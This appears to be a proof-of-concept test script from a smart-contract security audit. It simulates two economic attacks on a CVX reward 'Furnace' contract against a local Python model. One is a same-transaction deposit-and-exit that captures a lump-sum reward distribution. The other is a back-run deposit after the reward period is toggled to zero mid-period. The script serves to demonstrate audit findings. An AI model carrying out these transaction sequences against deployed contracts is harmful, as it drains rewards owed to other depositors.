"""T06  (a) JIT capture of a lump-sum distribution when periodLength == 0 (B3, R1)
        (b) B4: updatePeriodLength is not prospective (L4659-L4666 NatSpec: "effective after next
            reward distribution"); toggling to 0 mid-period turns the scheduled leftover into
            free CVX (totalCVXInPool L4455-L4459) that the next depositor realises at 1:1.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solsem import atomic
from furnace_model import Furnace

E18 = 10**18
DAY = 86400

def run(label, F, fn, *a):
    r = atomic(F, fn, *a)
    print("  %-62s -> %s" % (label, r))
    return r

print("=== T06a: P = 0, attacker deposits right before the permissionless locker harvest ===")
for D in (0, 1_000_000 * E18):
    F = Furnace(periodLength=0)
    atomic(F, F.deposit, "others", 1_000_000 * E18)
    if D:
        run("attacker.deposit(%de18)  [same tx as harvest]" % (D // E18), F, F.deposit, "att", D)
    run("CLeverCVXLocker.harvest() -> Furnace.distribute(10000e18)", F, F.distribute, "locker", 10_000 * E18)
    if D:
        r1 = run("attacker.exit()  [same tx]", F, F.exit, "att")
    print("  others' realised = %d" % F.getUserInfo("others")[1])
print("  => attacker converts 5000e18 clevCVX to CVX at 1:1 immediately; others' realisation halves")

print()
print("=== T06b: B4  updatePeriodLength(0) mid-period without settlement ===")
for settle_first in (True, False):
    F = Furnace(periodLength=7 * DAY)
    atomic(F, F.deposit, "alice", 10_000 * E18)
    atomic(F, F.distribute, "locker", 700 * E18)
    F.now += 1 * DAY
    if settle_first:
        atomic(F, F.updatePendingDistribution)
    atomic(F, F.updatePeriodLength, 0)          # governor / owner
    free = F.totalCVXInPool() - F.totalRealised
    r = atomic(F, F.deposit, "backrunner", 700 * E18)  # R1 back-run
    print("  settle_first=%-5s free CVX after toggle=%d  backrunner (unrealised, realised)=%s  alice alpha=%s" % (
        settle_first, free, r[1], F.getUserInfo("alice")))
